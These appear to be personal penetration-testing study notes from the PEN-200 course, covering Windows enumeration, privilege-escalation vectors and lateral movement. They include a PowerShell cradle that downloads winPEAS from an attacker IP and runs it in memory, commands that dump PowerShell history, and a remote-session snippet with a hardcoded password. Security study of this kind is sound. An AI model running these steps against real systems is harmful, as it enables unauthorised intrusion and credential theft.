# From pen-200 course.  




### Host enumeration

**can be automated with winPEAS.ps1**
```powershell
IEX(New-Object Net.WebClient).downloadString('http://192.168.45.247/winPEAS.ps1')
```
[winPEAS Github](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

<br>

**Enumeration checklist**

- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

<br><br><br>
Get all local users:  Get-LocalUser  
<a name="Get-LocalUser">

Get all local groups: Get-LocalGroup   OR net localgroup  
<a name="Get-LocalGroup">

Gather:  
- systeminfo
- ipconfig /a
- route print
- netstat -ano
- Get-Process
**SHOWS THE POWERSHELL  HISTORY**
- Get-History       
- type (Get-PSReadlineOption).HistorySavePath **this shows all history. Even what Clear-history doesnt clear**
- 
  <br><br>

  Get all installed programs X86:
  ``` powershell
  Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  ```

  Get all installed programs X64:
  ```powershell
  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  ```
<br>
<br>
<br>

### Leveraging Windows Services
<br>

***To get a list of all installed Windows services, we can choose various methods such as the GUI snap-in services.msc, the Get-Service Cmdlet, or the Get-CimInstance Cmdlet (superseding Get-WmiObject)***

<br>
#### Service Binary Hijacking

**get all running services, name,state and pathname**
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

<br>

#### DLL Hijacking 

***make a DLL and put it where the other DLL would load from.  Remember DLL load order***
<img width="845" height="178" alt="image" src="https://github.com/user-attachments/assets/a6b959ab-ae6b-4f8f-86a3-1da2a875e1b5" />
<br><br><br>

#### Unquoted service paths

Script below searches for unquoted service paths using CMD.exe  

``` cmd
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

<br>
### Scheduled tasks

three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:

- As which user account (principal) does this task get executed?
- What triggers are specified for the task?
- What actions are executed when one or more of these triggers are met?

***interesting information can be found in the Author, TaskName, Task To Run, Run As User, and Next Run Time fields***

<br><br>
### printer spooler enumeration
Check to see if print spooler is running
ls "\dc01\pipe\spoolss"

<br>
<br>
<br>


### Lateral movement techniques  
<br>
- Lateral movement with Enter-PSSession:
  
``` Powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```
<br>
- Lateral movement with Evil-winrm(apparently enter-pssession isnt too stable)
[Evil-WinRm github](https://github.com/Hackplayers/evil-winrm)

**WinRm is on port 5985**

<img width="835" height="725" alt="image" src="https://github.com/user-attachments/assets/13bc6534-e9d7-49a6-8c61-a06f995ea0cb" />



- 


  
